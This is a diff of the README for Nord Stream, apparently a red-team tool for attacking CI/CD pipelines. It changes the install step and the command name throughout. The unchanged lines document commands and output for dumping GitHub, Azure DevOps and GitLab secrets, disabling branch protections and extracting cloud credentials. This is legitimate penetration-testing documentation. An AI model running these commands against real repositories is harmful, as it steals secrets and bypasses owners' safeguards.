@@ -39,7 +39,7 @@ Find out more in the following blogpost: https://www.synacktiv.com/publications/
 ## Installation
 
 ```
-$ pip3 install -r requirements.txt
+$ pipx install git+https://github.com/synacktiv/nord-stream
 ```
 
 `git` is also required (see https://git-scm.com/download/) and must exist in your `PATH`.
@@ -48,7 +48,7 @@ $ pip3 install -r requirements.txt
 
 Here is a simple example on GitHub; initially, one can enumerate the various secrets.
 ```sh
-$ nord-stream.py github --token "$GHP" --org org --list-secrets --repo repo
+$ nord-stream github --token "$GHP" --org org --list-secrets --repo repo
 [*] Listing secrets:
 [*] "org/repo" secrets
 [*] Repo secrets:
@@ -60,7 +60,7 @@ $ nord-stream.py github --token "$GHP" --org org --list-secrets --repo repo
 
 Then proceed to the exfiltration:
 ```sh
-$ nord-stream.py github --token "$GHP" --org org --repo repo  
+$ nord-stream github --token "$GHP" --org org --repo repo  
 [+] "org/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
 [*] Getting secrets from repo: "org/repo"
@@ -91,7 +91,7 @@ Some arguments are shared between [GitHub](#github), [Azure DevOps](#azure-devop
 The `--describe-token` option can be used to display general information about your token:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --describe-token
+$ nord-stream github --token "$PAT" --describe-token
 [*] Token information:
         - Login: CICD
         - IsAdmin: False
@@ -105,7 +105,7 @@ $ nord-stream.py github --token "$PAT" --describe-token
 The `--build-yaml` option can be used to create a pipeline file without deploying it. It retrieves the various secret names to build the associated pipeline, which can be used to add custom steps:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --env PROD --build-yaml custom.yml
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --env PROD --build-yaml custom.yml
 [+] YAML file:
 name: GitHub Actions
 'on': push
@@ -141,7 +141,7 @@ jobs:
 ```
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --yaml custom.yml
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --yaml custom.yml
 [+] "synacktiv/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1"branch
 [*] Running custom workflow: .../custom.yml
@@ -191,7 +191,7 @@ uid                 [ultimate] test-gpg <test.gpg@cicd.local>
 ```
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main  --key-id F94496913C43EFC5 --user test-gpg --email test.gpg@cicd.local --force
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main  --key-id F94496913C43EFC5 --user test-gpg --email test.gpg@cicd.local --force
 [*] Using branch: "main"
 [+] "synacktiv/repo"
 [*] Getting secrets from environment: "prod" (synacktiv/repo)
@@ -240,7 +240,7 @@ hostname:::port:::user:::password:::privatekey
 
 If you want to run it on a self-hosted runner you can do the following:
 ```
-$ nord-stream.py devops ... --build-yaml test.yml --build-type ssh  
+$ nord-stream devops ... --build-yaml test.yml --build-type ssh  
 [+] YAML file:
 trigger: none
 pool:
@@ -275,17 +275,17 @@ Note: for both Windows and Linux self-hosted runners, you need to adapt the path
 
 #### Help
 ```
-$ python3 nord-stream.py devops -h
+$ nord-stream devops -h
 CICD pipeline exploitation tool
 
 Usage:
-    nord-stream.py devops [options] --token <pat> --org <org> [extraction] [--project <project> --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
-    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
-    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
-    nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
-    nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
-    nord-stream.py devops [options] --token <pat> --org <org> (--list-secrets [--project <project> --write-filter] | --list-users)
-    nord-stream.py devops [options] --token <pat> --org <org> --describe-token
+    nord-stream devops [options] --token <pat> --org <org> [extraction] [--project <project> --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
+    nord-stream devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
+    nord-stream devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
+    nord-stream devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
+    nord-stream devops [options] --token <pat> --org <org> --list-projects [--write-filter]
+    nord-stream devops [options] --token <pat> --org <org> (--list-secrets [--project <project> --write-filter] | --list-users)
+    nord-stream devops [options] --token <pat> --org <org> --describe-token
 
 Options:
     -h --help                               Show this screen.
@@ -324,10 +324,10 @@ Exctraction:
 
 Examples:
     List all secrets from all projects
-    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets
+    $ nord-stream devops --token "$PAT" --org myorg --list-secrets
 
     Dump all secrets from all projects
-    $ nord-stream.py devops --token "$PAT" --org myorg
+    $ nord-stream devops --token "$PAT" --org myorg
 
 Authors: @hugow @0hexit
 ```
@@ -339,7 +339,7 @@ Authors: @hugow @0hexit
 The `--list-protections` option can be used to list the protections applied to a branch and to environments:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --list-protections
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --list-protections
 [*] Using branch: "main"
 [*] Checking security: "synacktiv/repo"
 [*] Found branch protection rule on "main" branch
@@ -369,7 +369,7 @@ Depending on your permissions, you can have less information, only administrator
 The `--disable-protections` option can be used to temporarily disable the protections applied to a branch or an environment, realize the dump and restore all the protections:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --no-repo --no-org --env prod --disable-protections
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --no-repo --no-org --env prod --disable-protections
 [*] Using branch: "main"
 [+] "synacktiv/repo"
 [*] Found branch protection rule on "main" branch
@@ -418,7 +418,7 @@ If you come across such a workflow, this means that the repository might be conf
 Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --azure-client-id 65cd6002-25b9-11ee-88ac-7f80b19430c2 --azure-tenant-id 65cd6002-25b9-11ee-88ac-7f80b19430c2
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --azure-client-id 65cd6002-25b9-11ee-88ac-7f80b19430c2 --azure-tenant-id 65cd6002-25b9-11ee-88ac-7f80b19430c2
 [*] Using branch: "main"
 [+] "synacktiv/repo"
 [*] No branch protection rule found on "main" branch
@@ -472,7 +472,7 @@ If you come across such a workflow, this means that the repository might be conf
 Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
+$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
 [+] "Synacktiv/repo"
 [*] Running OIDC AWS credentials generation workflow
 [*] Getting workflow output
@@ -488,20 +488,20 @@ AWS_SECRET_ACCESS_KEY=7KJLCjdJKqlpLKDAI9F7SH6SjSQBX68Sjm13xXDA
 
 #### Help
 ```
-$ python3 nord-stream.py github -h
+$ nord-stream github -h
 CICD pipeline exploitation tool
 
 Usage:
-    nord-stream.py github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
-    nord-stream.py github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
-    nord-stream.py github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
-    nord-stream.py github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--env <env>]
-    nord-stream.py github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--azure-subscription-id <subscription> --repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
-    nord-stream.py github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
-    nord-stream.py github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections (--key-id <id> --user <user> --email <email>)]
-    nord-stream.py github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
-    nord-stream.py github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
-    nord-stream.py github [options] --token <ghp> --describe-token
+    nord-stream github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
+    nord-stream github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
+    nord-stream github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
+    nord-stream github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--env <env>]
+    nord-stream github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--azure-subscription-id <subscription> --repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections (--key-id <id> --user <user> --email <email>)]
+    nord-stream github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
+    nord-stream github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
+    nord-stream github [options] --token <ghp> --describe-token
 
 Options:
     -h --help                               Show this screen.
@@ -544,10 +544,10 @@ args
 
 Examples:
     List all secrets from all repositories
-    $ nord-stream.py github --token "$GHP" --org myorg --list-secrets
+    $ nord-stream github --token "$GHP" --org myorg --list-secrets
 
     Dump all secrets from all repositories and try to disable branch protections
-    $ nord-stream.py github --token "$GHP" --org myorg --disable-protections
+    $ nord-stream github --token "$GHP" --org myorg --disable-protections
 
 Authors: @hugow @0hexit
 ```
@@ -584,7 +584,7 @@ GitLab also support secure files like Azure DevOps. Secure files are defined at 
 Same as [YAML](#yaml), however you need to provide the full project path like this:
 
 ```sh
-$ nord-stream.py gitlab --token "$PAT" --url https://gitlab.corp.local --project 'group/projectname' --yaml ci.yml
+$ nord-stream gitlab --token "$PAT" --url https://gitlab.corp.local --project 'group/projectname' --yaml ci.yml
 ```
 
 The output of the command `--list-projects` returns such path.
@@ -595,15 +595,15 @@ Same as [GitHub list protections](#list-protections)
 
 #### Help
 ```
-$ python3 nord-stream.py gitlab -h
+$ nord-stream gitlab -h
 CICD pipeline exploitation tool
 
 Usage:
-    nord-stream.py gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter]
-    nord-stream.py gitlab [options] --token <pat> ( --list-groups | --list-projects ) [--project <project> --group <group> --write-filter]
-    nord-stream.py gitlab [options] --token <pat> --yaml <yaml> --project <project> [--no-clean]
-    nord-stream.py gitlab [options] --token <pat> --clean-logs [--project <project>]
-    nord-stream.py gitlab [options] --token <pat> --describe-token
+    nord-stream gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter]
+    nord-stream gitlab [options] --token <pat> ( --list-groups | --list-projects ) [--project <project> --group <group> --write-filter]
+    nord-stream gitlab [options] --token <pat> --yaml <yaml> --project <project> [--no-clean]
+    nord-stream gitlab [options] --token <pat> --clean-logs [--project <project>]
+    nord-stream gitlab [options] --token <pat> --describe-token
 
 Options:
     -h --help                               Show this screen.
@@ -639,10 +639,10 @@ args:
 
 Examples:
     Dump all secrets
-    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets
+    $ nord-stream gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets
 
     Deploy the custom pipeline on the master branch
-    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'
+    $ nord-stream gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'
 
 Authors: @hugow @0hexit
 ```
